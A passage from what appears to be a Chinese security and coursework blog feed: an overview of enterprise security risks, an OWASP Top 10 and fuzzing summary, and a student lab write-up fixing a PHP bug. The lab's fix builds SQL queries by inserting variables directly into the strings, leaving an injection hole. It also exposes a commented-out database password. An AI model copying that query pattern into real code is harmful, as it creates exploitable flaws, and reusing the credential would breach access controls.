署蜜签信标、延缓对手入侵时间、增加响应时间、增强入侵发现概率、浪费对手资源。</p><p>多样性、位置变换、动态呈现、非持久性、权限限制、整治、冗余、分段、证实可信性、不可预测性。</p><h1 id="识别主要的安全风险"><a href="#识别主要的安全风险" class="headerlink" title="识别主要的安全风险"></a>识别主要的安全风险</h1><p>互联网公司的特点是业务技术以Web和移动应用为主，涉及桌面软件、云服务、IoT硬件等。企业安全风险大多来自在线业务，同时企业内部也随时面临风险。</p><h2 id="在线业务"><a href="#在线业务" class="headerlink" title="在线业务"></a>在线业务</h2><h3 id="Web安全风险"><a href="#Web安全风险" class="headerlink" title="Web安全风险"></a>Web安全风险</h3><p>因为互联网公司业务以Web为主，所以业务面临的主要风险依然是Web漏洞，目前，SQL注入漏洞随着SQL预处理框架（如Java的MyBatis、PHP的PDO）的流行已经变得比较少见，但以往常见的XSS跨站、越权、逻辑漏洞以及新兴的JSONP注入、SSRF、XML实体注入、Java反序列化（Tomcat JMX反序列化、Weblogic反序列化、Fastjson&amp;Jackson反序列化、Spring RMI反序列化）漏洞依然流行，而且各种Web框架（如Struts2、Spring）漏洞和第三方组件漏洞（如引起QQ邮箱远程代码执行漏洞的图片处理组件ImageMagick的漏洞、读取YouTube敏感文件的视频处理组件FFmepg的漏洞）也不时出现。另外，与第三方合作的Web接口等也存在很大的安全风险，Facebook最大的数据泄露事件就是由于开放接口给第三方引起的。对于很多缺乏专业安全团队的公司来说，黑客上传的Webshell后门可以对其进行长达数年的远程控制。</p><h3 id="业务自身安全风险"><a href="#业务自身安全风险" class="headerlink" title="业务自身安全风险"></a>业务自身安全风险</h3><p>业务自身的安全隐患已经成为互联网公司的第二大安全风险。一般业务安全可以分为账户体系安全、交易体系安全、支付体系安全。对账户体系安全造成威胁的行为包括撞库、盗号/洗号/养号、垃圾注册、暴力破解、短信轰炸、钓鱼攻击等；对交易体系安全造成威胁的行为包括促销时恶意下单后退款、营销活动中“薅羊毛”、虚假交易刷排名等；对支付体系安全造成威胁的行为包括欺诈、盗刷、洗钱、恶意提现、信用卡套现、优惠券套现等。当然，业务不同，面临的业务风险也不一样，如视频网站还涉及盗播盗看、广告屏蔽等方面的风险，博客贴吧和即时通信平台涉及垃圾广告、低俗色情、违禁品、谣言等内容方面的安全。</p><h3 id="移动应用安全风险"><a href="#移动应用安全风险" class="headerlink" title="移动应用安全风险"></a>移动应用安全风险</h3><p>Android和iOS移动应用的安全问题逐渐成为互联网公司的第三大安全风险。移动应用主要存在的安全漏洞风险包括Android应用上存在的Log敏感信息泄露、Web HTTPS校验错误忽略漏洞、Provider组件暴露漏洞、Activity安全漏洞、使用不安全的加密模式等40多种漏洞风险，以及iOS应用上存在的未打开安全编译选项（-fobjc-arc、-fstack-protector-all、-pie）、不安全的随机数加密、后台模式敏感信息泄露（如打开了allowScreenShot配置）、不安全的剪贴板使用、不安全的反序列化（NSCoding、NSCoder）、SQLite注入、不安全的URL调用（registerForRemoteNotificationTypes、handleOpenURL）、不安全的数据存储、有漏洞的第三方组件（AFNetworking、ZipperDown）、含有后门的编译器（XcodeGhost）、溢出&amp;UAF等几十种安全风险。另外，Android和iOS移动应用还存在二次打包、反编译、破解、外挂、数据加密等安全加固问题。</p><h2 id="企业内部"><a href="#企业内部" class="headerlink" title="企业内部"></a>企业内部</h2><h3 id="来自员工的安全风险"><a href="#来自员工的安全风险" class="headerlink" title="来自员工的安全风险"></a>来自员工的安全风险</h3><p>极端情况下，有个别员工会受利益驱使买卖公司数据，也可能有心怀不满的员工故意搞破坏，甚至有对手公司专门派来做间谍的。除此之外，由于员工安全意识淡薄，有可能会出现随意上传程序代码到GitHub、网盘、个人邮箱，或者离开电脑不锁屏的情况，这些行为也存在一定的安全风险。</p><h3 id="口令安全风险"><a href="#口令安全风险" class="headerlink" title="口令安全风险"></a>口令安全风险</h3><p>①由于员工安全意识薄弱而使用弱口令，黑客通过暴力破解手段即可获取该口令。②黑客利用互联网上泄露的各网站数据库账号通过撞库即可定位员工的账号和密码。③通过社工（社会工程学）手段针对企业员工定向猜解或钓鱼。④公司内部缺乏账户安全体系建设，比如缺乏双因素认证机制（2FA）、没有统一的SSO（SingleSign On，单点登录）系统、员工离职后账号没有被删除，以及由于各种内部系统随意架设并使用独立的用户名密码而导致有的系统口令比较安全而另外一些很脆弱等。⑤由于缺乏传输加密和防ARP （AddressResolution Protocol，地址解析协议）攻击等嗅探防护而导致黑客通过网络流量抓包即可获取用户口令。</p><h3 id="来自钓鱼攻击和社会工程学的安全风险"><a href="#来自钓鱼攻击和社会工程学的安全风险" class="headerlink" title="来自钓鱼攻击和社会工程学的安全风险"></a>来自钓鱼攻击和社会工程学的安全风险</h3><p>常见的有邮件钓鱼、论坛和评论钓鱼、通信软件（QQ、微信等）钓鱼，国内也有不少利用公司QQ群、微信群冒充领导欺骗财务打款和套取公司内部信息的通信软件钓鱼案例。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础运维&quot;&gt;&lt;a href=&quot;#基础运维&quot; class=&quot;headerlink&quot; title=&quot;基础运维&quot;&gt;&lt;/a&gt;基础运维&lt;/h1&gt;&lt;p&gt;业务开发（Dev）完成后，就进入运维（Ops）阶段了，该阶段的资产管理、漏洞与补丁管理、安全配置基线、应急响应等如果没有做好
      
    
    </summary>
    
    
    
      <category term="安全运营" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>Web安全基础总结</title>
    <link href="http://yoursite.com/2020/05/20/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/05/20/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</id>
    <published>2020-05-20T13:20:43.000Z</published>
    <updated>2020-08-28T16:52:44.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="白帽子讲Web安全—小记"><a href="#白帽子讲Web安全—小记" class="headerlink" title="白帽子讲Web安全—小记"></a>白帽子讲Web安全—小记</h1><h2 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h2><ol><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection" target="_blank" rel="noopener"><strong>Injection</strong></a>。当将不受信任的数据作为命令或查询的一部分发送到解释器时，会发生注入缺陷，例如SQL，NoSQL，OS和LDAP注入。攻击者的敌对数据可能会诱使解释器执行未经预期的命令或未经适当授权而访问数据。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" target="_blank" rel="noopener"><strong>身份验证失败</strong></a>。与身份验证和会话管理有关的应用程序功能通常会错误地实现，从而使攻击者能够破坏密码，密钥或会话令牌，或者利用其他实现缺陷来临时或永久地假定其他用户的身份。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" target="_blank" rel="noopener"><strong>敏感数据暴露</strong></a>。许多Web应用程序和API无法正确保护敏感数据，例如金融，医疗保健和PII。攻击者可能会窃取或修改这些受保护程度不高的数据，以进行信用卡欺诈，身份盗用或其他犯罪。敏感数据可能会在没有额外保护的情况下受到损害，例如静态加密或传输中加密，并且在与浏览器进行交换时需要采取特殊的预防措施。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank" rel="noopener"><strong>XML外部实体（XXE）</strong></a>。许多较旧的或配置不当的XML处理器都会评估XML文档中的外部实体引用。外部实体可以使用文件URI处理程序，内部文件共享，内部端口扫描，远程代码执行和拒绝服务攻击来公开内部文件。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" target="_blank" rel="noopener"><strong>损坏的访问控制</strong></a>。通常，对身份验证用户允许执行的操作的限制通常未得到正确执行。攻击者可以利用这些缺陷来访问未经授权的功能和/或数据，例如访问其他用户的帐户，查看敏感文件，修改其他用户的数据，更改访问权限等。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" target="_blank" rel="noopener"><strong>安全配置错误</strong></a>。安全配置错误是最常见的问题。这通常是由于不安全的默认配置，不完整或临时的配置，开放的云存储，错误配置的HTTP标头以及包含敏感信息的冗长错误消息的结果。不仅必须安全地配置所有操作系统，框架，库和应用程序，而且还必须及时对其进行修补/升级。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener"><strong>跨站点脚本XSS</strong></a>。每当应用程序在未经适当验证或转义的情况下在新网页中包含不受信任的数据，或者使用可以创建HTML或JavaScript的浏览器API用用户提供的数据更新现有网页时，都会发生XSS漏洞。XSS允许攻击者在受害者的浏览器中执行脚本，这些脚本可以劫持用户会话，破坏网站或将用户重定向到恶意网站。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization" target="_blank" rel="noopener"><strong>不安全的反序列化</strong></a>。不安全的反序列化通常会导致远程执行代码。即使反序列化缺陷不会导致远程执行代码，也可以将它们用于执行攻击，包括重播攻击，注入攻击和特权升级攻击。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities" target="_blank" rel="noopener"><strong>使用已知漏洞的组件</strong></a>。诸如库，框架和其他软件模块之类的组件以与应用程序相同的特权运行。如果利用了易受攻击的组件，则此类攻击可能会导致严重的数据丢失或服务器接管。使用具有已知漏洞的组件的应用程序和API可能破坏应用程序防御，并造成各种攻击和影响。</li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%2526Monitoring" target="_blank" rel="noopener"><strong>日志和监控不足</strong></a>。日志和监视的不足，再加上事件响应的缺失或无效集成，使攻击者可以进一步攻击系统，保持持久性，转向更多系统以及篡改，提取或破坏数据。大多数违规研究表明，检测到违规的时间超过200天，通常由外部各方而不是内部流程或监视来检测。</li></ol><h1 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h1><p>模糊测试是一种黑盒软件测试技术，它基本上包括使用格式错误/半格式数据注入以自动方式查找实现错误。</p><p>一个简单的例子<br>考虑一个程序中的整数，该整数存储用户在3个问题之间进行选择的结果。当用户选择一个时，选择将是0、1或2。这是三种实际情况。但是，如果我们传输3或255怎么办？我们可以，因为整数存储了一个静态大小变量。如果未安全地实现默认开关情况，则该程序可能会崩溃并导致“经典”安全问题：（无法利用的）缓冲区溢出，DoS等……</p><p>模糊测试是自动发现错误的艺术，它的作用是发现软件实现错误，并在可能的情况下识别它们。</p><p>模糊测试是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。它充分利用了机器的能力：随机生成和发送数据；同时，也尝试将安全专家在安全性方面的经验引入进来。从执行过程来说，模糊测试的执行过程非常简单：<br>　　测试工具通过随机或是半随机的方式生成大量数据；<br>　　测试工具将生成的数据发送给被测试的系统（输入）；<br>　　测试工具检测被测系统的状态（如是否能够响应，响应是否正确等）；<br>　　根据被测系统的状态判断是否存在潜在的安全漏洞。<br>　　显然，模糊测试的整个执行过程是依靠工具进行的自动化测试。但是，看起来它完全是一个类似MonkeyTest工具的随机数据生成器嘛，这怎么能和安全专家的经验结合起来呢？别着急，我们用一个例子来演示一下。<br>　　为了简单起见，假定我们要测试的应用是一个C/S应用的服务端程序。这个程序运行在Unix平台上，名字叫做TgServer。我们唯一知道的信息就是客户端和TgServer之间使用基于TCP/IP的自定义协议进行通讯。这种情况下，我们该如何尝试找到应用系统中可能的漏洞？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;白帽子讲Web安全—小记&quot;&gt;&lt;a href=&quot;#白帽子讲Web安全—小记&quot; class=&quot;headerlink&quot; title=&quot;白帽子讲Web安全—小记&quot;&gt;&lt;/a&gt;白帽子讲Web安全—小记&lt;/h1&gt;&lt;h2 id=&quot;OWASP-TOP-10&quot;&gt;&lt;a href=&quot;#O
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SPM维护</title>
    <link href="http://yoursite.com/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/"/>
    <id>http://yoursite.com/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/</id>
    <published>2020-05-18T11:36:45.000Z</published>
    <updated>2020-05-25T06:54:15.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="软件项目管理"><a href="#软件项目管理" class="headerlink" title="软件项目管理"></a>软件项目管理</h2><h3 id="实验—LRR维护"><a href="#实验—LRR维护" class="headerlink" title="实验—LRR维护"></a>实验—LRR维护</h3><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>1.安装wampserver集成服务器组件（Apache+PHP+Mysql/MariaDB）。</p><p>2.phpmyadmin新建lrr数据库并导入sql文件，两个sql文件任选其一。</p><p>3.安装HBuilderX或PhpStorm，进行必要的配置。</p><p>4.打开LRR即为成功。</p><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/image-20200518221332226.png" class title="This is an image"><h4 id="维护流程"><a href="#维护流程" class="headerlink" title="维护流程"></a>维护流程</h4><p>1.明确bug，运行时错误，团队成员的名字在一组中多次出现。</p><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/image-20200518221343243.png" class title="This is an image"><blockquote><p><a href="http://118.25.96.118/bugzilla/show_bug.cgi?id=57" target="_blank" rel="noopener">http://118.25.96.118/bugzilla/show_bug.cgi?id=57</a></p><p>Hui Lan 2020-03-15 13:55:57 CST</p><p><a href="http://118.25.96.118/bugzilla/show_bug.cgi?id=57" target="_blank" rel="noopener">Repeated names in a course group</a></p><p>QWQ- Leader : 陆博业(201732120119)<br>Zhou Xianlong-201732120130 (Joined)<br>陆博业-201732120119 (Created)<br>吕伊豪-201732120120 (Joined)<br>郑可富-201732120129 (Joined)<br>郑可富-201732120129 (Joined)<br>郑可富-201732120129 (Joined)<br>郑可富-201732120129 (Joined)<br>郑可富-201732120129 (Joined)</p></blockquote><p>2.修改Script.php文件中的connection为本地root连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;$con&#x3D;mysqli_connect(&quot;localhost&quot;,&quot;Teecloudy&quot;,&quot;5q7Ol2e!#!&quot;,&quot;lrr&quot;);</span><br><span class="line">$con&#x3D;mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;lrr&quot;);</span><br></pre></td></tr></table></figure><p>3.因为此bug是学生端创建组问题，因此以学生身份登录，UserType=Student。</p><p>4.问题复现。</p><ul><li>创建Group，遇到的问题。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TypeError:$(...).dialog is not a function</span><br><span class="line">&#x2F;&#x2F;没有添加jquery-ui.css和jquery-ui.js</span><br><span class="line">TypeError: r.getClientRects is not a function</span><br><span class="line">&#x2F;&#x2F;添加的jquery-ui的版本为1.10.4导致此问题，更新为最新的1.12.1就显示正常了</span><br></pre></td></tr></table></figure><ul><li>重复邀请好友，还原到问题根本。</li></ul><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/image-20200520005825475.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/image-20200520141050255.png" class title="This is an image"><ul><li>猜测是系统没有判断该好友是否已加入队伍，好像很好修复，加个判断就行，那就来试一下。</li></ul><p>5.代码审计。</p><ul><li>定位到邀请好友模块。该页面处于Course.php中。</li></ul><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/image-20200520140322816.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/image-20200520140538458.png" class title="This is an image"><ul><li>表单传递到Script.php中处理。</li></ul><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/image-20200520140803714.png" class title="This is an image"><p>该Invite Group Request模块并未在插入数据之前检查这条数据的合理性（是否重复包含）。</p><p>在获取student_id后直接插入数据表course_group_members_table。</p><p>6.解决方法。在插入之前先查询，比较之后再执行sql语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; mysqli_query($con,&quot;SELECT * FROM course_group_members_table where Course_Group_id &#x3D; &#39;$groupid&#39; and Student_ID &#x3D; &#39;$student_id&#39;&quot;);</span><br><span class="line">if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">$_SESSION[&quot;info_ReMarking&quot;]&#x3D;&quot;This student has already been invited&quot;;</span><br><span class="line">header(&quot;Location: Course.php?url&#x3D;&quot;.$url);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$sql&#x3D;&quot;INSERT INTO &#96;course_group_members_table&#96;( &#96;Course_Group_id&#96;, &#96;Student_ID&#96;, &#96;Status&#96;) VALUES ($groupid,$student_id,&#39;Invited&#39;)&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该if-else语句首先查询数据库中是否存在要添加的student_id，若返回结果集中行的数量大于0，则表示已存在该student_id，那么重定向到当前页面；否则执行添加student_id的sql语句。</p><p>注意：把数据库表course_groups_table和course_group_members_table中重复的student_id数据先手动删除，否则mysqli_num_rows()返回值会大于0。</p><p>7.关于旧版和新版引申出的新bug。</p><p>我在旧版的基础上进行了修改，也保证了我的修改准确无误。</p><p>因为LRR更新了新版，因此我也在新版上进行了测试，但是我发现了一个问题（这样的问题可能不止我发现的这一处）。</p><p>我在添加成员后发现，course_group_members_table数据表的添加没有问题，course_groups_table中成员的student_id未添加。</p><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_12-58-32.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_12-58-54.png" class title="This is an image"><p>以下是旧版部分代码截图：</p><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_12-51-50.png" class title="This is an image"><p>以下是新版部分代码截图：</p><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_12-51-15.png" class title="This is an image"><p>可以发现新版LRR删除了部分代码，那部分被删除的代码刚好导致了这个原因，因此我重新添加了原来的代码，并修改了错误的title为原版的“Invite Group Request and add a new member into the database”。</p><p>8.验证测试。</p><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_13-54-30.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_13-54-41.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_13-54-53.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_13-55-05.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_14-53-26.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_13-55-37.png" class title="This is an image"><img src="/2020/05/18/SPM%E7%BB%B4%E6%8A%A4/Snipaste_2020-05-25_13-55-48.png" class title="This is an image"><p>因youtube、youku、bilibili等上传视频需实名认证和审核，所以录像上传至百度网盘。</p><p>链接：<a href="https://pan.baidu.com/s/1zbWNkLSf6g_iBh7j9I6-lQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1zbWNkLSf6g_iBh7j9I6-lQ</a><br>提取码：qwrj</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;软件项目管理&quot;&gt;&lt;a href=&quot;#软件项目管理&quot; class=&quot;headerlink&quot; title=&quot;软件项目管理&quot;&gt;&lt;/a&gt;软件项目管理&lt;/h2&gt;&lt;h3 id=&quot;实验—LRR维护&quot;&gt;&lt;a href=&quot;#实验—LRR维护&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
    
      <category term="SPM" scheme="http://yoursite.com/tags/SPM/"/>
    
  </entry>
  
</feed>
